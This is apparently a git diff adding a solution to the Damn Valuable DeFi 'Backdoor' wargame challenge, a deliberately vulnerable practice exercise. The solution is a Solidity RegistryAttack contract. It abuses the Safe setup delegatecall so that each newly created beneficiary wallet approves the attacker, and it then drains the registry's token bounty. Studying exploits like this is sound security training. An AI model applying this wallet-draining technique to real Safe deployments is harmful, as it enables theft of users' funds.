@@ -7,6 +7,9 @@ import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
+import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
+import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +73,8 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        RegistryAttack registryAttack = new RegistryAttack(address(singletonCopy), address(walletFactory), address(token), address(walletRegistry)); 
+        registryAttack.attack(users, recovery);
     }
 
     /**
@@ -92,5 +96,55 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract RegistryAttack is Test {
+
+    address public immutable masterCopy;
+    address public immutable walletFactory;
+    IERC20 public immutable token;
+    address public immutable registry;
+    uint public constant amount = 10e18;
+
+    constructor(address masterCopyAddress, address walletFactoryAddress, address tokenAddress, address _registry) {
+        masterCopy = masterCopyAddress;
+        walletFactory = walletFactoryAddress;
+        token = IERC20(tokenAddress);
+        registry = _registry;
+    }
+
+    // approves spender for 10 DVT tokens
+    function delegateApprove(address _spender, address _token) external {
+        IERC20(_token).approve(_spender, amount);
+    }
+
+    function attack (address[] memory beneficiaries, address recovery) external {
+
+        for(uint i = 0; i < beneficiaries.length; i++) {
+
+            address[] memory owner = new address[](1);
+            owner[0] = beneficiaries[i];
+            bytes memory _initializer = abi.encodeWithSelector(
+                Safe.setup.selector, // reference to `Safe` contract `setup` function selector
+                owner, // address[] _owners
+                1, // uint256 _threshold
+                address(this), // address `to`
+                abi.encodeWithSelector(RegistryAttack.delegateApprove.selector, address(this), address(token)),
+                address(0), // address fallback handler
+                address(0), // address paymentToken
+                0, // uint256 payment
+                address(0) // address paymentReceiver
+            );
+            // params: {address _singleton, bytes memeory initializer, saltNonce, callback}
+            (SafeProxy _proxy) = SafeProxyFactory(walletFactory).createProxyWithCallback(
+                masterCopy, 
+                _initializer, 
+                i, 
+                IProxyCreationCallback(registry)
+            );
+
+            token.transferFrom(address(_proxy), recovery, amount);
+        }
     }
 }
